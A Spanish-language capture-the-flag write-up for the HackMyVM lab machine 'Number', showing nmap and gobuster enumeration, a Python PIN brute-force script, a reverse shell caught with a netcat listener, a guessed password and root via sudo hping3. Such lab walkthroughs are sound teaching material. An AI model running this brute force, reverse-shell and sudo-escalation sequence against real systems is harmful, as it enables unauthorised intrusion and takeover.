---
layout: post
title: Number
date: 2023-05-29
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, SSH, Brute Force, Credentials]
---

# Number [ Hack My VM ]
![light mode only](/assets/img/imgs/number/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/number/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Mon May 29 10:20:22 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.1.117
Nmap scan report for 192.168.1.117
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 2f90c57ca162893aeceac351fa77f83f (RSA)
|   256 8e217185043da7db1de66f16270c0dc9 (ECDSA)
|_  256 e239c7ebf26d530ffd3c2c0531c95bf2 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:2D:D0:5E (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 29 10:20:41 2023 -- 1 IP address (1 host up) scanned in 19.82 seconds
```

Vemos que el puerto `22` está abierto, pero no tenemos ningún usuaio para poder conectarnos.

### Inspección
Como no hay mucho que ver en la página comenzaré por hacer **`fuzzing`**, es decir, con un diccionario iré probando rutas y archivos para ver si existen en el sistema. Para este proceso utilizaré **`GoBuster`**:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Number]
└─# gobuster dir -u "http://192.168.1.117" -w /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -b 404,503
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/external/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,503
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/05/29 11:40:39 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11]
/admin                (Status: 301) [Size: 185] [--> http://192.168.1.117/admin/]
/robots.txt           (Status: 200) [Size: 11]
/pin                  (Status: 301) [Size: 185] [--> http://192.168.1.117/pin/]
```

Tras un rato nos encontramos con estos resultados, vamos a dirigirnos a la ruta `admin`:

![admin](/assets/img/imgs/number/admin.png)

Vemos un panel para poder iniciar sesión, por desgracia no tenemos ningún usuario y mucho menos una contraseña, vamos a ver qué tenemos en la ruta `pin`:

![pin](/assets/img/imgs/number/pin.png)

Nos pide un **PIN** de cuatro números, como son pocos podemos tratar de hacer fuerza bruta, para ello creé este **`script`**:

```python
import requests

with open("wordlist.txt", "r") as f:
    lines = f.readlines()
    for number in lines:
        number = number.replace("\n", "")
        data = {
            "password": f"{number}",
        }

        r = requests.post("http://192.168.1.117/pin/pincheck.php", data=data)
        if r.text != "PIN WRONG.":
            print(f"PIN: {number}")
            break
        else:
            print(number, end="\r")

```

Como podéis ver estoy utilizando un diccionario, para crearlo utilizaremos **`Crunch`**, una herramienta que nos permite crear diccionarios de manera sencilla:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Number/scripts]
└─# crunch 4 4 0123456789 -o wordlist.txt
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```

¡Bien! Ya podemos utilizar el **`script`** creado anteriormente en conjunto del diccionario creado, para ello haremos lo siguiente:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Number/scripts]
└─# python3 brute_force_pin.py
PIN: 4444
```

Como podéis observar, tras un rato de espera nos encuentra el **PIN**, vamos a probarlo, a ver qué pasa:

![pinScreen](/assets//img/imgs/number/pinScreen.png)

Y eso es todo, no hay nada más. En este punto pensaba que había sido una broma y que era una distracción, pero me acordé de un fichero encontrado por **`GoBuster`**, estamos hablando del archivo **`robots.txt`**.

Si vamos a verlo encontraremos un fichero **`PHP`** llamado **`whoami.php`**, vamos a visitarlo:

![notFound](/assets/img/imgs/number/notFound.png)

Qué raro, no existe, vamos a probar a visitarlo dentro de la ruta **`pin`**:

![pinLogin](/assets/img/imgs/number/pinLogin.png)

¡Estupendo! Nos dice que hemos iniciado sesión como **`melon`**, esto ya me gusta más.

# Movimiento Lateral
### Shell
Para esta parte necesitamos volver a la ruta **`admin`**, ahora tenemos un usuario y una posible contraseña, vamos a probarlo:

![adminLogin](/assets/img/imgs/number/adminLogin.png)

¡Perfecto! Como vemos hemos conseguido acceso y nos aplica una redirección al fichero **`PHP`** `command.php`, vamos a ver de qué se trata:

![ipError](/assets/img/imgs/number/ipError.png)

Qué raro, nos pide una `IP` pero no podemos ingresar puntos, tratemos de ingresar un número cualquiera y veamos qué pasa:

![ipDiscover](/assets/img/imgs/number/ipDiscover.png)

¡Wow! ¿¡De verdad está lanzando una **`Reverse Shell`**!? Tendremos que descubrir cómo podemos ingresar nuestra `IP` sin puntos.

Tras estar un rato buscando soluciones se me ocurrió pasar la `IP` a decimal, para ello me fui a [IPAddressGuide](https://www.ipaddressguide.com/ip), una herramienta **online** para hacer una conversión rápida, aquí los resultados:

![ipDecimal](/assets/img/imgs/number/ipDecimal.png)

Como vemos nos ha dado el resultado en decimal de la `IP` `192.168.1.111`, pero antes de poner la `IP` en el panel que hemos descubierto debemos ver el puerto por el que nos llega, para ello utilizaré **`WireShark`**:

![decimalLaunch](/assets/img/imgs/number/decimalLaunch.png)

![wireshark](/assets/img/imgs/number/wireshark.png)

Como podéis ver nos está llegando por el puerto **`4444`**, por tanto ya estamos preparados para ponernos en escucha por el puerto descubierto y conseguir una **`Shell`**:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Number]
└─# nc -nlvp 4444
listening on [any] 4444 ...
```

Tras enviar de nuevo la petición con la `IP` en decimal recibimos al instante la conexión:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Number]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.111] from (UNKNOWN) [192.168.1.117] 38168
www-data@number:~/html/admin$
```

¡Estupendo! Ya estamos en la máquina, podemos pasar al siguiente paso para obtener el **control total** de la máquina.

### Subida de privilegios #1
Este paso es muy sencillo, por tanto será corto, pero os contaré mi experiencia.

Tras estar bastante rato mirando fichero tras fichero no llegué a nada, traté de buscar la contraseña del usuario `melon` bastante rato, pero nada, que no estaba.

Tras estar casi veinte minutos buscando probé "`melon`" como contraseña, y bueno, este es el resultado:

```sh
www-data@number:~$ su melon
Password: melon
melon@number:/var/www$
```

La verdad es que me reí un rato, ya que lo que menos te esperas es la respuesta. En fin, pasemos al siguiente paso.

### Subida de privilegios #2
Para este paso miraré los comandos que puede realizar el usuario `melon`, para ello utilizaré `sudo -l`:

```sh
melon@number:/var/www$ sudo -l
Matching Defaults entries for melon on number:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User melon may run the following commands on number:
    (ALL) NOPASSWD: /usr/sbin/hping3
```

Vemos que podemos ejecutar el binario `hping3` como cualquier usuario sin contraseña, eso incluye a `root`.

Si nos vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/hping3/#sudo) encontramos una manera para obtener `root` con este binario, vamos a realizar los pasos que nos dice:

```sh
melon@number:~$ sudo /usr/sbin/hping3
hping3> /bin/bash
root@number:/home/melon#
```

¡Enhorabuena! Ya tenemos el **control total** de la máquina. ¡Qué fácil!